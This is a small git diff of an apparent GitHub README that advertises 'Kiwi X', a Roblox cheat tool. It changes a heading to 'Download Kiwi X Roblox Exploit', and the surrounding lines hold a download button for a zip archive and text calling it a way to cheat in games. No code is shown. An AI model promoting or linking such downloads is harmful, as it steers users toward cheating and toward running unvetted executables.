@@ -3,7 +3,7 @@
 
 [![button](https://github.com/kiwi-x-roblox/kiwi-x-roblox.github.io/blob/main/button.png?raw=true)](https://github.com/kiwi-x-roblox/kiwi-x-roblox.github.io/releases/download/kiwix/Kiwi.X.zip)
 
-## Kiwi X - Roblox Exploit
+## Download Kiwi X Roblox Exploit
 
 Kiwi X is a popular Roblox exploit that allows users to gain an unfair advantage in games. The exploit is relatively easy to use, and it's been used in a variety of ways to cheat in games.
 
